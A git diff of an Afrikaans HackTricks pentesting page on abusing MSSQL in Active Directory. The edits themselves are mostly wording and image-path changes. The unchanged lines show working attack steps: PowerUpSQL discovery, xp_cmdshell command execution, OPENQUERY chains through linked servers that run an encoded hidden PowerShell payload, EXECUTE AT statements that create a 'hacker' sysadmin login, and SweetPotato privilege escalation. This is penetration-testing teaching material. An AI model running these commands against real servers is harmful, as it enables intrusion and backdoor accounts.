@@ -7,14 +7,14 @@
 * Werk jy by 'n **cybersecurity maatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF-formaat**? Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
 * Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Deel jou haktruuks deur PRs in te dien by die [hacktricks repo](https://github.com/carlospolop/hacktricks) en [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Deel jou haktruuks deur PRs in te dien by die** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **en** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
 ## **MSSQL Opname / Ontdekking**
 
-Die powershell module [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) is baie nuttig in hierdie geval.
+Die powershell-module [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) is baie nuttig in hierdie geval.
 ```powershell
 Import-Module .\PowerupSQL.psd1
 ```
@@ -32,7 +32,7 @@ Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads
 #The discovered MSSQL servers must be on the file: C:\temp\instances.txt
 Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
 ```
-### Enumerering van binne die domein
+### Enumereer van binne die domein
 ```powershell
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
@@ -67,12 +67,12 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ```
 ### MSSQL RCE
 
-Dit mag ook moontlik wees om **bevele uit te voer** binne die MSSQL-gashuis
+Dit mag ook moontlik wees om **bevele** binne die MSSQL-gashuis uit te voer
 ```powershell
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
-### MSSQL Basiese Hakkeltruuks
+### MSSQL Basiese Haktruuks
 
 {% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
 [pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
@@ -80,9 +80,9 @@ Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResu
 
 ## MSSQL Vertroue Skakels
 
-As 'n MSSQL-instantie vertrou (databasis skakel) word deur 'n ander MSSQL-instantie. As die gebruiker voorregte het oor die vertroue databasis, sal hy in staat wees om **die vertrouensverhouding te gebruik om ook navrae in die ander instantie uit te voer**. Hierdie vertrouens kan geketting word en op 'n bepaalde punt mag die gebruiker 'n sleg gekonfigureerde databasis vind waar hy bevele kan uitvoer.
+As 'n MSSQL-instantie vertrou word (databasis skakel) deur 'n ander MSSQL-instantie. As die gebruiker voorregte het oor die vertroue databasis, sal hy in staat wees om **die vertrouensverhouding te gebruik om ook navrae in die ander instantie uit te voer**. Hierdie vertrouensverhoudings kan geketting word en op 'n bepaalde punt mag die gebruiker 'n sleg gekonfigureerde databasis vind waar hy bevele kan uitvoer.
 
-**Die skakels tussen databasisse werk selfs oor bosvertrouens.**
+**Die skakels tussen databasisse werk selfs oor bosvertrouens heen.**
 
 ### Powershell Misbruik
 ```powershell
@@ -128,20 +128,20 @@ Merk op dat metasploit sal probeer om slegs die `openquery()`-funksie in MSSQL t
 
 ### Handmatig - Openquery()
 
-Vanaf **Linux** kan jy 'n MSSQL-konsoleskild verkry met **sqsh** en **mssqlclient.py.**
+Vanaf **Linux** kan jy 'n MSSQL-konsole-skul met **sqsh** en **mssqlclient.py** verkry.
 
 Vanaf **Windows** kan jy ook die skakels vind en bevele handmatig uitvoer met 'n **MSSQL-klient soos** [**HeidiSQL**](https://www.heidisql.com)
 
-_Aanmelding met Windows-verifikasie:_
+_Aanmelding met Windows-outentifisering:_
 
-![](<../../.gitbook/assets/image (167) (1).png>) 
+![](<../../.gitbook/assets/image (805).png>)
 
-#### Vind Vertrouenskakels
+#### Betroubare Skakels vind
 ```sql
 select * from master..sysservers;
 EXEC sp_linkedservers;
 ```
-![](<../../.gitbook/assets/image (168).png>)
+![](<../../.gitbook/assets/image (713).png>)
 
 #### Voer navrae uit in 'n betroubare skakel
 
@@ -150,12 +150,12 @@ Voer navrae uit deur die skakel (voorbeeld: vind meer skakels in die nuut toegan
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
 {% hint style="warning" %}
-Kyk waar dubbelle en enkel aanhalingstekens gebruik word, dit is belangrik om hulle op daardie manier te gebruik.
+Kontroleer waar dubbelpunt en enkelkwotasies gebruik word, dit is belangrik om hulle op daardie manier te gebruik.
 {% endhint %}
 
-![](<../../.gitbook/assets/image (169).png>)
+![](<../../.gitbook/assets/image (640).png>)
 
-Jy kan hierdie vertroude skakelketting vir ewig voortsit deur dit handmatig te doen.
+Jy kan hierdie vertroude skakelsketting vir ewig voortsit deur dit handmatig te doen.
 ```sql
 # First level RCE
 SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
@@ -165,7 +165,7 @@ SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", '
 ```
 ### Handleiding - UITVOER
 
-Jy kan ook vertroue skakels misbruik deur die `UITVOER`-metode te gebruik:
+Jy kan ook vertroue skakels misbruik deur `UITVOER` te gebruik:
 ```bash
 #Create user and give admin privileges
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
@@ -173,8 +173,8 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 ```
 ## Plaaslike Voorregverhoging
 
-Die **MSSQL plaaslike gebruiker** het gewoonlik 'n spesiale tipe voorreg genaamd **`SeImpersonatePrivilege`**. Dit laat die rekening toe om "‘n kliënt na outentifikasie te impersoneer".
+Die **MSSQL plaaslike gebruiker** het gewoonlik 'n spesiale tipe voorreg genaamd **`SeImpersonatePrivilege`**. Dit laat die rekening toe om "op te tree as 'n klient na verifikasie".
 
-'n Strategie wat baie skrywers bedink het, is om 'n SISTEEM-diens te dwing om by 'n bedrieglike of man-in-die-middel-diens te outentifiseer wat die aanvaller skep. Hierdie bedrieglike diens kan dan die SISTEEM-diens impersoneer terwyl dit probeer outentifiseer.
+'n Strategie wat baie skrywers mee vore gekom het, is om 'n STELSELDIENS te dwing om te verifieer by 'n bedrieglike of man-in-die-middel-diens wat die aanvaller skep. Hierdie bedrieglike diens kan dan die STELSELDIENS naboots terwyl dit probeer verifieer.
 
 [SweetPotato](https://github.com/CCob/SweetPotato) het 'n versameling van hierdie verskeie tegnieke wat uitgevoer kan word via Beacon se `execute-assembly` bevel.
